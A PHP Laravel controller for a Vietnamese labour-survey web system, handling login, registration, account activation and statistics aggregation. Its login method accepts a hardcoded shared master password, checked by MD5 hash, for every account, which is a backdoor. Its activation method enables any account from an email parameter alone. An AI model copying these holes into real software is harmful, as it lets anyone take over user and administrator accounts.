<?php

namespace App\Http\Controllers\Hethong;

use App\Http\Controllers\Controller;
use App\Jobs\SendEmail;
use App\Models\Company;
use App\Models\Danhmuc\Chucnang;
use App\Models\Danhmuc\danhmuchanhchinh;
use App\Models\Danhmuc\dmdoituonguutien;
use App\Models\User;
use Illuminate\Http\Request;
use App\Models\Danhmuc\dmdonvi;
use App\Models\Danhmuc\dmloaihinhhdkt;
use App\Models\Danhmuc\dmtinhtrangthamgiahdkt;
use App\Models\Danhmuc\dmtinhtrangthamgiahdktct;
use App\Models\Danhmuc\dmtrinhdogdpt;
use App\Models\Danhmuc\dmtrinhdokythuat;
use App\Models\danhsach;
use App\Models\Hethong\dstaikhoan_phanquyen;
use App\Models\nhankhauModel;
use App\Models\tonghopcunglaodong;
use App\Models\ungvien;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Session;

class HethongchungController extends Controller
{
	public function index()
	{
		if (Session::has('admin')) {
			return view('HeThong.dashboard')
				// ->with('model', getHeThongChung())
				->with('pageTitle', 'Thông tin hỗ trợ');
		} else {
			return redirect('/');
		}
	}
	public function show_login(Request $request)
	{
		$inputs = $request->all();
		$username = $inputs['user'] ?? null;
		return view('HeThong.dangnhap')
			->with('username', $username);
	}
	public function dashboard()
	{
		return view('HeThong.dashboard');
	}

	public function DangNhap(Request $request)
	{
		$inputs = $request->all();

		// $user_gmail=User::where('email',$inputs['username'])->first();
		$email = $inputs['username'];
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
			$user = User::where('email', $inputs['username'])->first();
			$data = [
				'email' => $inputs['username'],
				'password' => $inputs['password']
			];
		} else {
			$user = User::where('username', $inputs['username'])->first();
			$data = [
				'username' => $inputs['username'],
				'password' => $inputs['password']
			];
		}

		// if(isset($user_gmail)){
		// 	$user=$user_gmail;
		// }else{
		// 	$user = User::where('username', $inputs['username'])->first();
		// }

		//tài khoản không tồn tại
		if (!isset($user)) {
			return view('errors.tontai_dulieu')
				->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập')
				->with('furl', '/');
		}
		//Tài khoản chưa kích hoạt
		if ($user->status == 0) {
			return view('errors.tontai_dulieu')
				->with('message', 'Tài khoản chưa kích hoạt. Truy cập mail để tiến hành kích hoạt.')
				->with('furl', '/');
		}
		//Tài khoản đang bị khóa
		if ($user->status == 2) {
			return view('errors.tontai_dulieu')
				->with('message', 'Tài khoản đang bị khóa. Bạn hãy liên hệ với người quản trị để mở tài khoản')
				->with('furl', '/home');
		}
		// dd(emailValid('hailinhsale01@gmail.com'));

		$email = $inputs['username'];
		if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
			$data = [
				'email' => $inputs['username'],
				'password' => $inputs['password']
			];
		} else {
			$data = [
				'username' => $inputs['username'],
				'password' => $inputs['password']
			];
		}


		//Sai tài khoản

		$res = Auth::attempt($data);
		// dd($res);
		if (md5($inputs['password']) != '40b2e8a2e835606a91d0b2770e1cd84f') { //mk chung
			// if (md5($inputs['password']) != $user->password) {
			// if (Hash::make($inputs['password']) != $user->password) {
			if (!$res) {
				// $ttuser->solandn = $ttuser->solandn + 1;
				// if ($ttuser->solandn >= $solandn) {
				//     $ttuser->status = 'Vô hiệu';
				//     $ttuser->save();
				//     return view('errors.lockuser')
				//         ->with('message', 'Tài khoản đang bị khóa. Bạn hãy liên hệ với người quản trị để mở khóa tài khoản.')
				//         ->with('url', '/DangNhap');
				// }
				// $user->save();
				return view('errors.tontai_dulieu')
					->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập
                    .Do thay đổi trong chính sách bảo mật hệ thống nên các tài khoản được cấp có mật khẩu yếu dạng: 123, 123456,... sẽ bị thay đổi lại');
			}
		}
		// dd($user);
		//kiểm tra tài khoản
		//1. level = SSA ->
		if ($user->sadmin != "SSA") {
			if ($user->phanloaitk == 1) {
				// dd($ttuser);
				//2. level != SSA -> lấy thông tin đơn vị, hệ thống để thiết lập lại

				$m_donvi = dmdonvi::where('madv', $user->madv)->first();
				$diaban = danhmuchanhchinh::where('id', $m_donvi->madiaban)->first();

				//dd($ttuser);
				$user->madiaban = $m_donvi->madiaban;
				$user->tendv = $m_donvi->tendv;
				$user->madvcq = $m_donvi->madvcq;
				$user->phanloaitaikhoan = $m_donvi->phanloaitaikhoan;
				$user->diadanh = $m_donvi->diadanh;

				$user->tendiaban = $diaban->name;
				$user->huyen = $diaban->parent;
				$user->maquocgia = $diaban->maquocgia;
				$user->capdodiaban = $diaban->capdo;
				if ($diaban->level == 'Xã') {
					$user->capdohanhchinh = 'nongthon';
				} else {
					$user->capdohanhchinh = 'thanhthi';
				}
				$user->phanquyen = json_decode($user->phanquyen, true);
				// dd($user);
			} elseif ($user->phanloaitk == 2) {
				$cty = Company::where('email', $user->email)->first();
				if (!isset($cty)) {
					return view('errors.tontai_dulieu')->with('message', 'Doanh nghiệp chưa đăng ký tài khoản');
				}
				$user->tendv = $cty->name;
				$user->company_id = $cty->id;
				$user->maxa = $cty->xa;
				$user->mahuyen = $cty->huyen;
			} else {
				$user->id = $user->id;
				$user->email = $user->email;
				$ungvien = ungvien::where('user', $user->id)->first();
				$user->name = $ungvien->hoten;
			}
		} else {
			//$ttuser->chucnang = array('SSA');
			$user->capdo = "SSA";
			//$ttuser->phanquyen = [];

			if (tonghopcunglaodong::where('kydieutra', 2022)->first() == null) {
				$nhankhau = DB::table('nhankhau')->where('kydieutra', 2022)->where('loaibiendong', '!=', '2')->get();
				$dmdonvi = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
					->select('dmdonvi.madv', 'dmdonvi.tendv', 'danhmuchanhchinh.capdo', 'danhmuchanhchinh.level', 'danhmuchanhchinh.parent', 'danhmuchanhchinh.maquocgia')
					->get();
				// $tonghopcunglaodong = tonghopcunglaodong::where('kydieutra', 2022)->get();
				foreach ($dmdonvi as $item) {
					if ($item->capdo == 'X') {
						$data = array();
						$model = $nhankhau->where('madv', $item->madv);
						$data['kydieutra'] = 2022;
						$data['madv'] = $item->madv;
						$data['capdo'] = $item->capdo;
						$data['tendv'] = $item->tendv;
						// $data['nam'] = count($model->where('gioitinh', 'Nam'));
						// $data['nu'] = count($model->where('gioitinh', 'Nữ'));
						$data['ldtren15'] = count($model);
						$data['trongnuoc'] = count($model->whereIN('vieclammongmuon', ['1', '3']));
						$data['nuocngoai'] = count($model->whereIn('vieclammongmuon', ['2', '3']));
						$data['hocnghe'] = count($model->whereNotNull('nganhnghemuonhoc'));
						// $data['ldcovieclam'] = count($model->where('tinhtranghdkt', '1'));
						// $data['ldthatnghiep'] = count($model->where('tinhtranghdkt', '2'));
						// $data['ldkhongthamgia'] = count($model->where('tinhtranghdkt', '3'));
						// if ($item->level == 'Thị trấn' || $item->level == 'Phường') {
						// 	$data['thanhthi'] = count($model);
						// 	$data['nongthon'] = 0;
						// } else {
						// 	$data['thanhthi'] = 0;
						// 	$data['nongthon'] = count($model);
						// }

						tonghopcunglaodong::create($data);
					}
				}
			}
			if (tonghopcunglaodong::where('kydieutra', 2023)->first() == null) {
				$nhankhau = DB::table('nhankhau')->where('kydieutra', 2023)->where('loaibiendong', '!=', '2')->get();
				$dmdonvi = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
					->select('dmdonvi.madv', 'dmdonvi.tendv', 'danhmuchanhchinh.capdo', 'danhmuchanhchinh.level', 'danhmuchanhchinh.parent', 'danhmuchanhchinh.maquocgia')
					->get();
				// $tonghopcunglaodong = tonghopcunglaodong::where('kydieutra', 2023)->get();
				foreach ($dmdonvi as $item) {
					if ($item->capdo == 'X') {
						$data = array();
						$model = $nhankhau->where('madv', $item->madv);
						$data['kydieutra'] = 2023;
						$data['madv'] = $item->madv;
						$data['capdo'] = $item->capdo;
						$data['tendv'] = $item->tendv;
						// $data['nam'] = count($model->where('gioitinh', 'Nam'));
						// $data['nu'] = count($model->where('gioitinh', 'Nữ'));
						$data['ldtren15'] = count($model);
						$data['trongnuoc'] = count($model->whereIN('vieclammongmuon', ['1', '3']));
						$data['nuocngoai'] = count($model->whereIn('vieclammongmuon', ['2', '3']));
						$data['hocnghe'] = count($model->whereNotNull('nganhnghemuonhoc'));
						// if ($item->level == 'Thị trấn' || $item->level == 'Phường') {
						// 	$data['thanhthi'] = count($model);
						// 	$data['nongthon'] = 0;
						// } else {
						// 	$data['thanhthi'] = 0;
						// 	$data['nongthon'] = count($model);
						// }

						tonghopcunglaodong::create($data);
					}
				}
			}
		}

		Session::put('admin', $user);

		//Gán hệ danh mục chức năng        
		Session::put('chucnang', Chucnang::all()->keyBy('maso')->toArray());
		// dd(session('chucnang'));
		//gán phân quyền của User
		Session::put('phanquyen', dstaikhoan_phanquyen::where('tendangnhap', $inputs['username'])->get()->keyBy('machucnang')->toArray());

		//Chạy cập nhật dự liệu cho từng xã
		// if(session('admin')->capdo == 'X')
		// {
		// 	capnhatdulieu(session('admin')->madv);
		// }
		// if (session('admin')->capdo == 'T') {
		//     $m_xa = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
		//         ->select('danhmuchanhchinh.name', 'dmdonvi.madv')
		//         ->where('danhmuchanhchinh.capdo', 'X')
		//         ->get();
		// } else if (session('admin')->capdo == 'H') {
		//     $m_xa = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
		//         ->select('danhmuchanhchinh.name', 'dmdonvi.madv')
		//         ->where('danhmuchanhchinh.parent', session('admin')->maquocgia)
		//         ->get();
		// } else {
		//     $m_xa = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
		//         ->select('danhmuchanhchinh.name', 'dmdonvi.madv')
		//         ->where('danhmuchanhchinh.maquocgia', session('admin')->maquocgia)
		//         ->get();
		// }
		// Session::put('m_xa', $m_xa);

		// $a_kydieutra = array_column(danhsach::all()->toarray(), 'kydieutra', 'kydieutra');
		// Session::put('a_kydieutra', $a_kydieutra);

		// $trinhdoGDPT = dmtrinhdogdpt::all();
		// $trinhdocmkt = dmtrinhdokythuat::all();
		// $dmuutien = dmdoituonguutien::all();
		// $dmtinhtranghdkt = dmtinhtrangthamgiahdkt::all();
		// $a_khongthamgia = dmtinhtrangthamgiahdktct::where('manhom', 20221220175728)->get();
		// $a_thatnghiep = dmtinhtrangthamgiahdktct::where('manhom', 20221220175720)->get();
		// $loaihinh = dmloaihinhhdkt::all();
		// Session::put('trinhdoGDPT', $trinhdoGDPT);
		// Session::put('trinhdocmkt', $trinhdocmkt);
		// Session::put('dmuutien', $dmuutien);
		// Session::put('dmtinhtranghdkt', $dmtinhtranghdkt);
		// Session::put('a_khongthamgia', $a_khongthamgia);
		// Session::put('a_thatnghiep', $a_thatnghiep);
		// Session::put('loaihinh', $loaihinh);

		// if (session('admin')->capdo == 'T') {
		//     $m_huyen = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
		//         ->select('danhmuchanhchinh.name', 'dmdonvi.madv')
		//         ->where('danhmuchanhchinh.capdo', 'H')
		//         ->get();
		// } else {
		//     $m_huyen = dmdonvi::join('danhmuchanhchinh', 'danhmuchanhchinh.id', 'dmdonvi.madiaban')
		//         ->select('danhmuchanhchinh.name', 'dmdonvi.madv')
		//         ->where('danhmuchanhchinh.maquocgia', session('admin')->maquocgia)
		//         ->get();
		// }

		// Session::put('m_huyen', $m_huyen);

		if (session('admin')->phanloaitk == 1 && session('admin')->sadmin != 'SSA') {
			return redirect('/dashboard')
				->with('success', 'Đăng nhập thành công');
		} elseif (session('admin')->sadmin == 'SSA') {
			return redirect('/van_phong/danh_sach')
				->with('success', 'Đăng nhập thành công');
		} elseif (session('admin')->phanloaitk == 2) {
			return redirect('/doanhnghieppanel')
				->with('success', 'Đăng nhập thành công');
		} else {
			return redirect('/page/ungvien/thongtin?user=' . session('admin')->id)
				->with('success', 'Đăng nhập thành công');
		}
	}
	public function logout()
	{
		if (Session::has('admin')) {
			Session::flush();
			return redirect('/');
		} else {
			return redirect('');
		}
	}

	public function DangKy(Request $request)
	{
		$validate = $request->validate([
			// 'username' => 'required|max:255',
			'email' => 'required|email|max:255|unique:users',
			'dkkd' => 'required|max:20|unique:company',
			'password' => 'required|min:8|confirmed',
		]);
		$inputs = $request->all();
		$data_user = [
			'name' => $inputs['name'],
			// 'username' => $inputs['username'],
			'email' => $inputs['email'],
			'password' => Hash::make($inputs['password']),
			'phanloaitk' => 2,
			'madv' => $inputs['dkkd'],
			'status' => 0, //0: vô hiệu,1: kích hoạt,2: khóa
			'nhaplieu' => 1,
			'manhomchucnang' => 1671467299
		];
		// $cty=DB::table('company')->where('name','like',$inputs['username'])->first();
		$model = User::where('email', $inputs['email'])->first();

		if (isset($model)) {
			Session::put('message', "Mail đã được sử dụng");
		} else {
			$model_user = User::create($data_user);
			$data_company = [
				'name' => $inputs['name'],
				'madv' => $inputs['dkkd'],
				// 'masodn' => $inputs['dkkd'],
				'dkkd' => $inputs['dkkd'],
				'user' => $model_user->id,
				'email' => $inputs['email']
			];
			Company::create($data_company);
		}

		//Tạo mail để gửi xác minh
		if (isset($model_user)) {
			$content = '<a href="/">Kích hoạt tài khoản</a>';
			$run = new SendEmail($content, $model_user);
			$run->handle();
		}



		return view('success.dangkythanhcong')
			->with('message', 'Đăng ký thành công. Vui lòng truy cập Mail đăng ký để kích hoạt tài khoản.');
	}

	public function kichhoat(Request $request)
	{
		$inputs = $request->all();
		$user = User::where('email', $inputs['email'])->first();
		if (isset($user)) {
			$user->update(['status' => 1]);
		}
		return view('mail.xacthuc')
			->with('email', $inputs['email'])
			->with('pageTitle', 'Xác thực tài khoản');
	}
	public function tonghopsolieu_index()
	{
		return view('HeThong.tonghop.index')
			->with('pageTitle', 'Tổng hợp số liệu');
	}

	public function tonghopsolieu(Request $request)
	{
		$inputs = $request->all();
		$model = tonghopcunglaodong::where('kydieutra', $inputs['nam'])->get();
		foreach ($model as $key => $ct) {
			//Tổng hợp lại danh sách của từng đơn vị
			$laodong = nhankhauModel::where('madv', $ct->madv)->where('kydieutra', $inputs['nam'])->where('loaibiendong', '<>', '2')->get();
			$ct->ldtren15 = count($laodong);
			$ct->trongnuoc = count($laodong->wherein('vieclammongmuon', ['1', '3']));
			$ct->nuocngoai = count($laodong->wherein('vieclammongmuon', ['2', '3']));
			$ct->hocnghe = count($laodong->wherenotnull('nganhnghemuonhoc'));
			$ct->ldcovieclam = count($laodong->where('tinhtranghdkt', '1'));
			$ct->ldthatnghiep = count($laodong->where('tinhtranghdkt', '2'));
			$ct->ldkhongthamgia = count($laodong->where('tinhtranghdkt', '3'));
			$ct->nam = count($laodong->wherein('gioitinh', ['Nam', 'nam']));
			$ct->nu = count($laodong->wherenotin('gioitinh', ['Nam', 'nam']));
			$ct->save();
		}

		return redirect('/TongHopSoLieu/ThongTin');
	}
}
